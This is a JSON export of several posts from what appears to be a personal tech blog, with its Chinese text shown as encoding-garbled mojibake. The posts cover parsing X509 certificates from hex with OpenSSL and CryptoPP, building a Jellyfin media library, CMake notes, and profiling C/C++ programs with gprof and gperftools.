X509è¯ä¹¦ä»HexStreamä¸­è§£æ","slug":"Openssl-X509è¯ä¹¦ä»HexStreamä¸­è§£æ","date":"2024-05-10T07:45:55.000Z","updated":"2025-02-21T07:37:41.130Z","comments":true,"path":"posts/1e2fb27c/","link":"","permalink":"https://www.sizaif.com/posts/1e2fb27c/","excerpt":"","text":"æ•´ä½“æ€è·¯ ä»hex è½¬æ¢æˆå­—èŠ‚æµ ç„¶åä»å­—èŠ‚æµä¸­è¿›è¡Œè§£æ You have access to the raw certificate in memory. In the case that you have access to the raw encoding of the certificate in memory, you can parse it as follows. This is useful if you have stored raw certificates in a database or similar data store. #include #include #include const unsigned char *data = ... ; size_t len = ... ; X509 *cert = d2i_X509(NULL, &amp;data, len); if (!cert) &#123; fprintf(stderr, \"unable to parse certificate in memory\\n\"); return EXIT_FAILURE; &#125; // any additional processing would go here.. X509_free(cert); ä½¿ç”¨OpenSSL è§£æ std::string hex_str = \"30820317308201ffa003020102021432e1f.....\"; // hex -> binaryData std::vector&lt;uint8_t> binaryData; for (size_t i = 0; i &lt; hex_str.size(); i += 2) &#123; unsigned int byte; sscanf(hex_str.substr(i, 2).c_str(), \"%02X\", &amp;byte); binaryData.push_back(byte); &#125; // å°† char* è½¬æ¢ä¸º unsigned char* const unsigned char* uchar_ptr = binaryData.data(); size_t len = binaryData.size(); X509 *cert = d2i_X509(NULL,&amp;uchar_ptr,len); if (!cert) &#123; printf(\"Failed to load certificate from bytes\\n\"); return 1; &#125; // æ‰“å°è¯ä¹¦ä¿¡æ¯ X509_print_fp(stdout, cert); // é‡Šæ”¾èµ„æº X509_free(cert); ä½¿ç”¨CryptoPP è§£æ std::string hex_str = \"30820317308201ffa003020102021.....\"; std::string binaryData; CryptoPP::StringSource(hex_str, true, new CryptoPP::HexDecoder( new CryptoPP::StringSink(binaryData) ) ); CryptoPP::ByteQueue googleq, thawteq, googletbs, thawtespki; CryptoPP::SecByteBlock certSignature; googleq.Put((const CryptoPP::byte*)binaryData.data(), binaryData.size()); CryptoPP::X509Certificate cert; cert.Load(googleq); // è·å–å…¬é’¥ const CryptoPP::PublicKey&amp; publicKey = cert.GetSubjectPublicKey(); // å¦‚æœä½ ç¡®å®šè¯ä¹¦çš„ç±»å‹æ˜¯ RSAï¼Œä½ å¯ä»¥å°† PublicKey å¼ºåˆ¶è½¬æ¢ä¸º RSA å…¬é’¥ const CryptoPP::RSA::PublicKey&amp; rsaPublicKey = dynamic_cast&lt;const RSA::PublicKey&amp;>(publicKey); // è·å– RSA æ¨¡æ•° const CryptoPP::Integer&amp; modulus = rsaPublicKey.GetModulus(); // æ‰“å°å…¬é’¥ä¿¡æ¯ std::cout &lt;&lt; \"Public Key: \" &lt;&lt;rsaPublicKey.GetPublicExponent()&lt;&lt; std::endl; // æ‰“å° RSA æ¨¡æ•° std::cout &lt;&lt; \"RSA Modulus: \" &lt;&lt; modulus&lt;&lt; std::endl;","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"C++","slug":"æŠ€æœ¯å‘/C","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/C/"}],"tags":[{"name":"X509è¯ä¹¦è§£æ","slug":"X509è¯ä¹¦è§£æ","permalink":"https://www.sizaif.com/tags/X509%E8%AF%81%E4%B9%A6%E8%A7%A3%E6%9E%90/"},{"name":"HexStream","slug":"HexStream","permalink":"https://www.sizaif.com/tags/HexStream/"}],"author":"sizaif"},{"title":"æ­å»ºå½±è§†åº“è¯•è¯•æ‰‹","slug":"æ­å»ºå½±è§†åº“è¯•è¯•æ‰‹","date":"2024-03-18T03:11:11.000Z","updated":"2025-02-25T11:24:22.218Z","comments":true,"path":"posts/74e6b323/","link":"","permalink":"https://www.sizaif.com/posts/74e6b323/","excerpt":"","text":"å‰è¨€ æˆ‘æ‰¿è®¤æˆ‘ç»„ä¼šçš„æ—¶å€™å¼€å°å·®äº†ï¼Œåœ¨å¦‚æ­¤é«˜å‹çš„æƒ…å†µä¸‹ï¼Œæˆ‘ç«Ÿåœ¨ç¥æ¸¸~ã€‚è„‘è¢‹é‡Œçªç„¶æƒ³åˆ°æˆ‘ä¹‹å‰åˆ·çŸ¥ä¹çœ‹åˆ°çš„ç¾¤æ™–NASä¹‹ç±»çš„ç›¸å…³è¯é¢˜ï¼Œç„¶åå°±æœ‰äº†å¼„ä¸ªåª’ä½“åº“çš„æƒ³æ³•ï¼Œé¡ºä¾¿æ•´ç†æ•´ç†æˆ‘çš„è®¾å¤‡ä¸ŠPTåšçš„ç§å­ã€‚è¯´ç™½äº†NASå°±æ˜¯ä¸€ä¸ª24Hä¸å…³æœºçš„å…±äº«æœåŠ¡å™¨å˜›ï¼Œæ­£å¥½æˆ‘çš„å·¥ä½œæœºå™¨å°±æ˜¯24Hä¸å…³æœºï¼Œåœ¨è„‘æµ·é‡Œå¤§æ¦‚æµ®ç°äº†é¢„è®¾çš„ç”»é¢ï¼š å¯¹åª’ä½“åº“çš„é¢„è®¾æœŸæœ›ï¼š èƒ½å¤Ÿè‡ªåŠ¨æ•´ç†åšç§çš„å½±ç‰‡ ï¼ˆè™½ç„¶PTä¸‹è½½çš„æ—¶å€™å¤§æ¦‚åˆ†äº†ç±»ï¼Œä½†æ˜¯å†°å†·çš„æ–‡ä»¶å¤¹å¤ªå†·æ¼ äº†ï¼‰ å¯¹åšç§çš„èµ„æºè¿›è¡Œè‡ªåŠ¨åˆ®å‰Šï¼Œç±»ä¼¼äºçˆ±å¥‡è‰ºè¿™æ ·çš„è§†é¢‘ç½‘ç«™ï¼Œèƒ½çœ‹ç”µå½±æˆ–ç”µè§†å‰§çš„è¯¦ç»†ä¿¡æ¯ï¼Œç®€ä»‹å•¥çš„ (æ¯•ç«Ÿè‡ªå·±æ‰‹åŠ¨å»æŸ¥ä¿¡æ¯çœŸçš„å¤ªéº»çƒ¦äº†) å¯ä»¥ä»æ‰‹æœº/å…¶ä»–è®¾å¤‡ç›´æ¥åœ¨çº¿æ’­æ”¾è§†é¢‘ ï¼ˆæ¯•ç«Ÿè°ä¸æƒ³èººåœ¨åºŠä¸Šä»¥ä¸€ä¸ªèˆ’æœçš„å§¿åŠ¿çœ‹æ— æŸçš„èµ„æºå‘¢ï¼‰ æ‰€ä»¥è¯´å¹²å°±å¹²å§ï¼Œæ­£å¥½æˆ‘çš„ä¸¤ä¸ªç¡¬ç›˜éƒ½æ»¡äº† æœ€è¿‘ä¹Ÿåœ¨çŠ¹è±«æ˜¯ä¸æ˜¯åœ¨æä¸€ä¸ª16Tçš„ç¡¬ç›˜ï¼Œç„¶åæŠŠè¿™ä¸¤ä¸ªç¡¬ç›˜é‡Œçš„æ•°æ®æ‹·è´åˆ°æ–°ç¡¬ç›˜é‡Œï¼Œç„¶åé‡æ–°æ•´ç†ï¼ŒæŠŠè¿™ä¸¤ä¸ªç¡¬ç›˜åšä¸€ä¸ªRAID0ï¼Œå˜æˆ8Tçš„ç¡¬ç›˜ã€‚è„‘å­é‡Œæœ€è¿‘ä¸€ç›´åœ¨æ‰“ç®—è¿™ä¸ªäº‹ã€‚ å…¶æ¬¡æˆ‘çš„PTåšç§ä¹Ÿåšäº†ä¸å°‘äº†ï¼Œåœ¨RSä¸Šä¹Ÿç®—å¯ä»¥è¯´æ˜¯å¤§ä½¬äº†å“ˆå“ˆï¼Œæ¯•ç«Ÿæ˜¯ç¬¬ä¸€ä¸ªè¾¾æˆNEXUX MASTERçš„å•¦ å“ˆå“ˆï¼Œå°å°å‚²å¨‡ä¸€ä¸‹ æ‰€ç”¨åˆ°å·¥å…· Jellyfin-windows å½±ç‰‡åº“ tinymediamanager èµ„æºä¿¡æ¯åˆ®å‰Šå™¨ å®‰è£…Jellfinå è®¾ç½®åª’ä½“åº“è·¯å¾„ï¼Œä»¥åŠé…ç½®ç›¸å…³çš„é…ç½®ï¼Œè®¾ç½®ä»£ç†ï¼Œå…ƒæ•°æ®ä¿¡æ¯ç­‰ ç„¶åç”¨tinymediamanager æ¥è¿›è¡Œå½±è§†ä¿¡æ¯åˆ®å‰Šï¼ŒJellfinè‡ªå¸¦çš„åˆ®å‰Šå™¨ä¸€èˆ¬æƒ…å†µï¼Œæ‰€ä»¥ç”¨tinymediamanageræ¥æœç´¢ è®°å¾—æºé€‰æ‹©ï¼šthmoivedb.org å¯¹ä¸­æ–‡æ”¯æŒæ¯”è¾ƒå‹å¥½ å‚è€ƒè§†é¢‘ï¼š ã€è¶…å®Œç¾æ•´ç†å®¶åº­å½±éŸ³èµ„æ–™åº“ï¼Œå®Œç¾é€‚é…Kodi, Emby, Jellyfin, Plexç­‰å®¶åº­å½±éŸ³è½¯ä»¶-By tinymediamanagerã€‘ https://www.bilibili.com/video/BV1DE41187FG/?share_source=copy_web&amp;vd_source=6953266e5edee58abf75e1a5445b51c2 ã€ã€ç”µè„‘/å½±è§†ã€‘ä»é›¶å¼€å§‹æ­å»ºå®¶åº­å½±éŸ³åº“ï¼Œè§£é”è§‚å½±æ–°å§¿åŠ¿ï¼Œä¸åªWindowsï¼Œå…¨å¹³å°é€‚é…ã€‚è¶…çº§è¯¦ç»†çš„jellyfiné…ç½®è§†é¢‘ã€‚ã€‘ https://www.bilibili.com/video/BV1hF411k7GV/?share_source=copy_web&amp;vd_source=6953266e5edee58abf75e1a5445b51c2 æ’­æ”¾çš„è¯ï¼Œä½¿ç”¨Nvidiç¡¬ä»¶åŠ é€Ÿï¼Œä¹Ÿæ˜¯å¯ä»¥ç›´æ¥æ’­æ”¾çš„ï¼Œ æœ¬åœ°ç›´æ¥è°ƒç”¨potplayerè¿›è¡Œæ’­æ”¾ï¼Œè¿œç¨‹çš„è¯ é€šè¿‡åœ¨çº¿æ’­æ”¾ æœ¬åœ°è°ƒç”¨potplayerå‚è€ƒï¼š http://www.potplayercn.com/course/3041.html https://github.com/tccoin/Jellyfin-Potplayer æœ€ç»ˆæ•ˆæœ å†…ç½‘ç©¿é€ è‹¦äºæ²¡æœ‰å…¬ç½‘IPV4 IPV6 ä½¿ç”¨zerotier one æ¥è¿›è¡Œp2p å†…ç½‘ç©¿é€ åˆ›å»ºä¸€ä¸ªç½‘ç»œ å†…ç½‘è®¾å¤‡é€šè¿‡ç½‘ç»œIDåŠ å…¥è¿™ä¸ªç½‘ç»œ å¤–ç½‘è®¾å¤‡é€šè¿‡ç½‘ç»œIDåŠ å…¥è¿™ä¸ªç½‘ç»œ ç½‘é¡µç»™è®¾å¤‡æˆæƒ ç„¶åç»„å»ºè™šæ‹Ÿå±€åŸŸç½‘è¿›è¡Œè®¿é—®","categories":[],"tags":[{"name":"åª’ä½“åº“","slug":"åª’ä½“åº“","permalink":"https://www.sizaif.com/tags/%E5%AA%92%E4%BD%93%E5%BA%93/"},{"name":"æµåª’ä½“","slug":"æµåª’ä½“","permalink":"https://www.sizaif.com/tags/%E6%B5%81%E5%AA%92%E4%BD%93/"}],"author":"sizaif"},{"title":"Cmake ä½¿ç”¨è¿‡ç¨‹ä¸­çš„ä¸€äº›è®°å½•","slug":"Cmake-ä½¿ç”¨è¿‡ç¨‹ä¸­çš„ä¸€äº›è®°å½•","date":"2024-03-11T02:01:18.000Z","updated":"2024-03-28T02:55:44.000Z","comments":true,"path":"posts/a49ee1f7/","link":"","permalink":"https://www.sizaif.com/posts/a49ee1f7/","excerpt":"","text":"Cmake ä½¿ç”¨è¿‡ç¨‹ä¸­çš„ä¸€äº›è®°å½• å†™åœ¨å‰é¢ ç»ˆäºè¿˜æ˜¯ç”¨èµ·æ¥cmakeäº†ï¼Œ å…ˆå‰éƒ½æ˜¯æ‰‹æ’•makefilesï¼Œ ç›´æ¥ç”¨makefilesç¼–å†™é¡¹ç›®æ–‡ä»¶ ä½†ç»ˆå½’è¿˜æ˜¯å¤ªéº»çƒ¦ï¼Œéœ€è¦è€ƒè™‘å„ç§ä¾èµ–å…³ç³»ï¼Œå¯ä»¥è¯´æ˜¯äº‹æ— å·¨ç»†ï¼Œåæ¥è½¬åˆ°windowsä¸Šåšé¡¹ç›®å¼€å‘ï¼Œæ‰å‘ç° cmakeç‰¹åˆ«å¥½ç”¨ï¼ŒçœŸçš„èƒ½çœå¾ˆå¤šäº‹ å‚è€ƒ ä¼˜é›…çš„æœ¬åœ°å¼€å‘ï¼Œè¿œç¨‹linuxç¯å¢ƒè°ƒè¯•ï¼ŒClionå†³ç»å­ æœ¬åœ°clionå¼€å‘/ä¼˜é›…åœ°è°ƒè¯•ï¼Œå¹¶å®æ—¶åŒæ­¥è¿œç¨‹æœåŠ¡å™¨ Cmake-Example cmake-examples ä¸€ä¸ªéå¸¸å¥½çš„githubå¼€æºåº“ï¼Œä½œä¸ºcmakeåˆå­¦è€…éå¸¸é€‚ç”¨ è®°å½•å¸¸ç”¨åˆ°çš„cmakeç”¨æ³• include_directories è®¾å®šæœ¬é¡¹ç›®å¼•å…¥çš„å¤´æ–‡ä»¶è·¯å¾„ï¼Œ$&#123;PROJECT_SOURCES&#125; å¯ä»¥é€šè¿‡set() æ¥è®¾ç½®ï¼› include_directories($&#123;PROJECT_SOURCES&#125;&#x2F;include) å½“å¼•å…¥å¤´æ–‡ä»¶è·¯å¾„åï¼Œåœ¨é¡¹ç›®ç¼–å†™æ—¶å°±å¯ä»¥éå¸¸ä¼˜é›…çš„å¼•å…¥äº† ä¾‹å¦‚ï¼š é¡¹ç›®ç»“æ„å¦‚ä¸‹ main-project: include: basic: headerA.h pro: plus: headerB.h src: main.cpp å‡è®¾headerBéœ€è¦å¼•å…¥headerA.hå¤´æ–‡ä»¶ï¼Œ ä¸€èˆ¬çš„å†™æ³•æ˜¯include &quot;../../basic/headerA.h&quot; è¿™ç§ç›¸å¯¹è·¯å¾„ å½“æˆ‘ä»¬è®¾ç½®include_directories($&#123;main_project_path&#125;/include)å åªéœ€è¦åœ¨headerB.hä¸­å†™include &quot;basic/headerA.h&quot; å°±å¯ä»¥äº†ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬æ‰¾åˆ°å¯¹äºçš„è·¯å¾„ä¸‹çš„æ–‡ä»¶ é‚£ä¹ˆåœ¨main.cppä¸­å¼•å…¥å¤´æ–‡ä»¶æ—¶ åªéœ€è¦ç¼–å†™: #include \"basic/headerA.h\" #include \"pro/plus/headerB.h\" target_link_libraries ä¸ target_include_directories target_link_libraries target_include_directories è¿™ä¸¤ä¸ªçš„ç”¨æ³•éƒ½æ˜¯åœ¨è®¾å®šç”Ÿæˆåº“æ–‡ä»¶æˆ–è€…å¯æ‰§è¡Œæ–‡ä»¶æ ‡è¯†ä¹‹åï¼š add_library / add_executable # ç¼–è¯‘ç”Ÿæˆé™æ€åº“&#x2F;åŠ¨æ€åº“ add_library(&lt;name&gt; STATIC&#x2F;SHARED &lt;sourcefiles&gt;) # åº“çš„å¤´æ–‡ä»¶æœç´¢è·¯å¾„&#x2F; ä¾èµ–é¡¹ # ç­‰ä»·äº makefileä¸­çš„ -L&#x2F;path target_include_directories(&lt;name&gt; &lt;option&gt; &lt;path&gt;) target_link_libraries(&lt;name&gt; &lt;option&gt; &lt;deplibraries&gt;) &gt;target_include_directories(target [SYSTEM] [BEFORE] &lt;INTERFACE|PUBLIC|PRIVATE&gt; [items1...] [&lt;INTERFACE|PUBLIC|PRIVATE&gt; [items2...] ...]) å…¶ä¸­ï¼Œtarget æ˜¯ç›®æ ‡åç§°ï¼Œå¯ä»¥æ˜¯åº“æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„åç§°ã€‚ SYSTEM è¡¨ç¤ºè¿™äº›å¤´æ–‡ä»¶æ˜¯ç³»ç»Ÿå¤´æ–‡ä»¶ï¼ŒBEFORE è¡¨ç¤ºè¿™äº›è·¯å¾„å°†è¢«æ·»åŠ åˆ°å…¶ä»–è·¯å¾„ä¹‹å‰ã€‚INTERFACEã€PUBLIC å’Œ PRIVATE æ˜¯æŒ‡å®šè¿™äº›è·¯å¾„çš„å¯è§æ€§ã€‚å®ƒä»¬çš„å«ä¹‰å¦‚ä¸‹ï¼š INTERFACEï¼šè¿™äº›è·¯å¾„åªä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡çš„æ¥å£ä¸­ï¼Œä¸ä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡è‡ªèº«çš„ç¼–è¯‘é€‰é¡¹ä¸­ã€‚ PUBLICï¼šè¿™äº›è·¯å¾„ä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡è‡ªèº«çš„ç¼–è¯‘é€‰é¡¹ä¸­ï¼ŒåŒæ—¶ä¹Ÿä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡çš„æ¥å£ä¸­ã€‚ PRIVATEï¼šè¿™äº›è·¯å¾„åªä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡è‡ªèº«çš„ç¼–è¯‘é€‰é¡¹ä¸­ï¼Œä¸ä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡çš„æ¥å£ä¸­ã€‚ items æ˜¯å¤´æ–‡ä»¶æœç´¢è·¯å¾„ï¼Œå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„æˆ–ç›¸å¯¹è·¯å¾„ã€‚å¦‚æœæ˜¯ç›¸å¯¹è·¯å¾„ï¼Œä¼šç›¸å¯¹äºå½“å‰ CMakeLists.txt æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•è¿›è¡Œè§£æã€‚ Subject é¡¹ç›®ç»“æ„ï¼š main_project sub_project_A: project_A_files CMakeLists.txt sub_project_B: project_B_files CMakeLists.txt CMakeLists.txt sub_projectA ä¸sub_projectBéƒ½æ˜¯main_projectçš„ä¾èµ–åº“ å…¶ä¸­projectBåˆä¾èµ–äºprojectA åœ¨main_projectä¸‹çš„CMakeLists.txtä¸­ å¯ä»¥é€šè¿‡ä¸€ä¸‹å‘½ä»¤ï¼Œç»™å­subjectä¼ å‚ï¼Œ ä»¥åŠæ·»åŠ å­é¡¹ç›® set(PROJECT_SOURCES $&#123;CMAKE_CURRENT_SOURCE_DIR&#125;&#x2F;path&#x2F;to&#x2F;proejctA) add_subdirectory(path&#x2F;to&#x2F;project) åœ¨sub_projectBä¸­é€šè¿‡ä¸»é¡¹ç›®çš„ä¼ å‚ï¼Œæ‹¿åˆ°sub_projectAçš„è·¯å¾„ï¼Œå°±å¯ä»¥ è®¾ç½®include_directories target_link_libraries target_include_directories äº†","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"C++","slug":"æŠ€æœ¯å‘/C","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://www.sizaif.com/tags/C/"},{"name":"Cmake","slug":"Cmake","permalink":"https://www.sizaif.com/tags/Cmake/"}],"author":"sizaif"},{"title":"C/C++ ä½¿ç”¨Gprofåˆ†æè¿è¡Œæ€§èƒ½æµ‹è¯•","slug":"C-C-ä½¿ç”¨gprofåˆ†æè¿è¡Œæ€§èƒ½æµ‹è¯•","date":"2023-08-22T07:48:22.000Z","updated":"2023-12-08T03:13:21.000Z","comments":true,"path":"posts/8162d461/","link":"","permalink":"https://www.sizaif.com/posts/8162d461/","excerpt":"","text":"å‰è¨€ å¯¹äºC/C++ å¦‚æœæƒ³åˆ†ææŸä¸ªå‡½æ•°æµ‹è¯•ç”¨æ—¶æ—¶é—´ï¼Œä»¥åŠæƒ³ä»æ•´ä½“ä¸Šåˆ†æä»£ç æ•ˆç‡å¦‚ä½•ï¼Œå¯ä»¥ä½¿ç”¨gprofå·¥å…·æ¥è¿›è¡Œæµ‹è¯•ï¼Œå¹¶å¯è§†åŒ–ç”Ÿæˆæ¯ä¸ªå‡½æ•°æ¨¡å—çš„ç”¨æ—¶å æ¯”å›¾ã€‚ GNU gprof C++ gprof ä½¿ç”¨æ–¹æ³• 1.ç¼–è¯‘ï¼š gcc -g -c myprog.c utils.c -pg gcc -o myprog myprog.o utils.o -pg g++/clang++ -g mysrc.cpp -o myprogram -pg &lt;other arg> The `-pgâ€™ option also works with a command that both compiles and links: gcc&#x2F;clang -o myprog myprog.c utils.c -g -pg æ³¨æ„ï¼š å¦‚æœä½¿ç”¨äº†clang-14 ä¹‹åçš„ç‰ˆæœ¬ ï¼Œ é»˜è®¤ä½¿ç”¨DWARF V5ç‰ˆæœ¬ï¼Œ è€Œgprof åªæ”¯æŒåˆ°DWARF V4 å°±ä¼šå‡ºç°ä¸€ä¸‹é”™è¯¯ï¼š BFD: DWARF error: invalid or unhandled FORM value: 0x25 è§£å†³æ–¹æ³•ï¼š ç¼–è¯‘æ—¶ä¿®æ”¹ -g ä¸º -gdwarf-4 clang -o myprog myprog.c utils.c -gdwarf-4 -pg å¦‚æœä¸è¡Œï¼Œ å‚è€ƒï¼šUbuntu ç¼–è¯‘å®‰è£… Binutils2.4ç‰ˆæœ¬https://www.sizaif.com/posts/1b7755b0/ 2.æ­£å¸¸æ‰§è¡Œç¨‹åº ç”Ÿæˆ gmon.out ./myprogram æ³¨æ„ï¼šgprof è¦æ±‚ç¨‹åºèƒ½å¤Ÿæ­£å¸¸ç»“æŸï¼Œ æ‚¨çš„ç¨‹åºå¿…é¡»æ­£å¸¸é€€å‡ºï¼šé€šè¿‡ä» main è¿”å›æˆ–è°ƒç”¨ exitã€‚ è°ƒç”¨ä½çº§å‡½æ•° _exit ä¸ä¼šå†™å…¥é…ç½®æ–‡ä»¶æ•°æ®ï¼Œä¹Ÿä¸ä¼šç”±äºæœªå¤„ç†çš„ä¿¡å·è€Œå¼‚å¸¸ç»ˆæ­¢ã€‚ In order to write the `gmon.outâ€™ file properly, your program must exit normally: by returning from main or by calling exit. Calling the low-level function _exit does not write the profile data, and neither does abnormal termination due to an unhandled signal. å¦‚æœæƒ³ç”¨gprofæµ‹è¯•éœ€è¦CTRL+Cä¸­æ–­é€€å‡ºçš„ç¨‹åº å‰æ–‡æåˆ° gprof å¿…é¡»è¦æ±‚ç¨‹åºæ­£å¸¸é€€å‡ºï¼Œ è€ŒCTRL+C ä¸­æ–­ä¿¡å·ç­‰ ä¸èƒ½æ­£å¸¸ç”Ÿæˆgmon.outæ–‡ä»¶ï¼Œ æ—¢ç„¶æ²¡æœ‰gmon.outæ–‡ä»¶ä¹Ÿå°±æ— æ³•åˆ†ææ€§èƒ½ï¼Œ è°ƒç”¨exit(0) é’ˆå¯¹åƒCTRL+C ä¸å¯è¡Œï¼Œ ä½¿ç”¨kill -15 PID ä¹Ÿæ— æ³•ç”Ÿæˆgmon.out è§£å†³æ–¹æ³•ï¼šå¤„ç†è‡ªå®šä¹‰ä¿¡å· SIGUSR1 é’ˆå¯¹ç›®å‰ç¨‹åºæ’æ¡©ï¼Œ ä½¿å…¶è°ƒç”¨å¤–éƒ¨å‡½æ•°ï¼Œ å¤–éƒ¨å‡½æ•°ä¸­åŒ…å«å¦‚ä¸‹ä¿¡å·å¤„ç†ä»£ç ï¼š #include &lt;dlfcn.h> void sigUsr1Handler(int sig)&#123; .... // ç¨‹åºå…³é—­å‰ å¤„ç†å¿…è¦æ“ä½œ // å¤„ç† SIGUSR1 ä¿¡å· fprintf(stderr, \"Received SIGUSR1 signal. Generating gmon.out file...\\n\"); void (*_mcleanup)(void); _mcleanup = (void (*)(void))dlsym(RTLD_DEFAULT, \"_mcleanup\"); if (_mcleanup == NULL) fprintf(stderr, \"Unable to find gprof exit hook\\n\"); else _mcleanup(); _exit(0); &#125; // æ³¨å†Œä¿¡å· signal(SIGUSR1, sigUsr1Handler); ç¼–è¯‘å¤–éƒ¨ä¾èµ–åº“ï¼š è¿™é‡Œä½¿ç”¨ -Wl,--no-as-needed -ldl æ¥è§£å†³ å¼•å…¥dlsym æœªå®šä¹‰çš„æƒ…å†µ å‚è€ƒï¼š [Saving gmon.out before killing a process](https://stackoverflow.com/questions/10205543/saving-gmon-out-before-killing-a-process) #makefile $(CXX) $(CXXFLAGS) -g -Wl,--no-as-needed -ldl -pg -fPIC -shared $(SRC_PATH)/src.cpp -o $(LIB_PATH)/libmycode.so æœ€åå½“ç¨‹åºç»“æŸæ—¶ï¼Œä¼šè°ƒç”¨_mcleanupï¼Œå…¶å®šä¹‰åœ¨gmon/gmon.cä¸­ã€‚ >void _mcleanup (void) >&#123; __moncontrol (0); if (_gmonparam.state != GMON_PROF_ERROR) write_gmon (); /* free the memory. */ free (_gmonparam.tos); >&#125; é¦–å…ˆå…¶é€šè¿‡__moncontrolï¼ˆ0ï¼‰ç»“æŸprofilå·¥ä½œï¼Œå…¶æ¬¡é€šè¿‡write_gmon ()å‡½æ•°å°†profileä¿¡æ¯è¾“å‡ºåˆ°gmon.outæ–‡ä»¶ä¸­ã€‚ libåŠ¨æ€ä¾èµ–åº“ æµ‹è¯•ï¼Ÿ - gprofæ— æ³•æµ‹è¯• gprof æ— æ³•åˆ†æåŠ¨æ€ä¾èµ–åº“ åªèƒ½åˆ†æé™æ€å‡½æ•° æ•…å†æµ‹è¯• openssl æ€§èƒ½ç“¶é¢ˆæ—¶ ï¼Œé™æ€ç¼–è¯‘ ./Configure --prefix=$prefix_static \\ no-shared \\ '-L/home/workhome/llvm_test/llvm-tutorial-opt/work07/dev/lib -ltaintcpp.a' å¤–éƒ¨å‡½æ•°è°ƒç”¨libtaintcpp.aæ–‡ä»¶ # makefile $(AR) -c rsc $(LIB_PATH)/libtaintcpp.a $(LIB_PATH)/util.o ç›®å‰é‡åˆ°çš„é—®é¢˜ï¼š æµ‹è¯•openssl æ—¶ï¼Œ ç¼–è¯‘é™æ€libssl.a,libcrypto.a æ–‡ä»¶ é“¾æ¥åˆ°openssl ä½†æˆ‘çš„å¤–éƒ¨å‡½æ•°æ˜¯C++ï¼Œåº”ç”¨äº†STLåº“ä¸­å‡½æ•°ï¼Œ Clang æ— æ³•é“¾æ¥é™æ€ç‰ˆæœ¬çš„libstdc++.aæ–‡ä»¶ï¼Œ åªèƒ½ä½¿ç”¨-lstdc++é“¾æ¥åŠ¨æ€ï¼Œ å¯¼è‡´é™æ€åŠ¨æ€æ··ç”¨ https://blog.csdn.net/giantchen547792075/article/details/12780675/ åœ¨è¿™ç‰‡æ–‡ç« ä¸­æåˆ° åŠ¨æ€é™æ€æ··ç”¨å®¹æ˜“å‡ºç°å¯¹å†…å­˜ç”³è¯·å’Œé‡Šæ”¾ä¸æ˜¯åŒä¸€ä¸ªå †ä¸Šï¼Œæ‰€æœ‰ä¼šå‡ºé”™ æ­£å¦‚ä¸‹é¢è¿è¡Œå›¾æ‰€ç¤ºï¼š Google CPU Profiler ä¼˜åŠ¿ google gprof æ˜¯æ”¯æŒåŠ¨æ€ä¾èµ–åº“æµ‹è¯•çš„ï¼Œä¹Ÿå³.so/dllï¼Œ ç›¸æ¯”è¾ƒ GNU gprofæ¥è¯´ä¸éœ€è¦ç‰¹æ„ç¼–è¯‘æˆé™æ€ä¾èµ–åº“ã€‚ Google CPU Profiler å®‰è£… 1.å‘½ä»¤è¡Œå®‰è£…2.ç¼–è¯‘å®‰è£…ï¼š$ sudo apt-get install libgoogle-perftools-dev google-perftoolshttps://github.com/gperftools/gperftools git clone https://github.com/gperftools/gperftools cd gperftools ./autogen.sh ./configure --prefix=`pwd`/gperftools-build --enable-frame-pointers make sudo make install ln -s `pwd`/gperftools-build/lib/libprofiler.so /usr/lib/libprofiler.so æ³¨æ„äº‹é¡¹ï¼š https://github.com/gperftools/gperftools/blob/master/INSTALL If you are on x86-64 system, know that you have a set of system libraries with frame-pointers enabled, and compile all your applications with -fno-omit-frame-pointer, then you can enable the built-in perftools stack unwinder by passing the --enable-frame-pointers flag to configure. Even with the use of libunwind, there are still known problems with stack unwinding on 64-bit systems, particularly x86-64. See the \"64-BIT ISSUES\" section in README. If you encounter problems, try compiling perftools with './configure --enable-frame-pointers'. Note you will need to compile your application with frame pointers (via 'gcc -fno-omit-frame-pointer ...') in this case. https://gperftools.github.io/gperftools/cpuprofile.html https://developer.ridgerun.com/wiki/index.php/Profiling_with_GPerfTools ä½¿ç”¨ 1.ç¼–è¯‘ä½¿ç”¨ ç¼–è¯‘æ—¶ æ·»åŠ -lprofiler ä½¿å…¶èƒ½å¤Ÿé“¾æ¥åˆ°libprofiler.so åŠ¨æ€åº“ æˆ–è€…åœ¨è¿è¡Œæ—¶ä½¿ç”¨ï¼šLD_PRELOADè¿è¡Œæ—¶åŠ è½½åŠ¨æ€åº“ LD_PRELOAD=/usr/local/lib/libprofiler.so CPUPROFILE=test.prof ./path/to/bin LD_PRELOAD: Path to the libprofiler.so usually located at /usr/local/lib/ or /usr/lib/x86_64-linux-gnu for 64 bit systems. æ ¹æ®Configure --prefix= æ¥å®šï¼Œ å¦‚æœæ²¡æœ‰è®¾ç½®--prefix é»˜è®¤åº”åœ¨/usr/local/lib CPUPROFILE: Name of the output log file 2.è¿è¡Œç¨‹åº ä½¿å…¶æ­£å¸¸ç»“æŸï¼Œ Ctrl+C ä¸­æ–­ä¿¡å·ä¸ä¼šç”Ÿæˆæ—¥å¿—XXX.profæ–‡ä»¶ Keep the application open or running until it finishes, in this mode if the execution is canceled for example with Ctrl+C the output file will not be generated. 2.è¿è¡Œä¸­äº§ç”Ÿï¼š CPUPROFILE=test.prof CPUPROFILESIGNAL=12 ./path/to/bin å¯åŠ¨æ—¶æ·»åŠ CPUPROFILESIGNAL=12 , ä¿¡å·æ ‡å¿—ï¼Œ å½“æƒ³å¼€å§‹è®¡ç®—æ—¶ kill -12 $PID 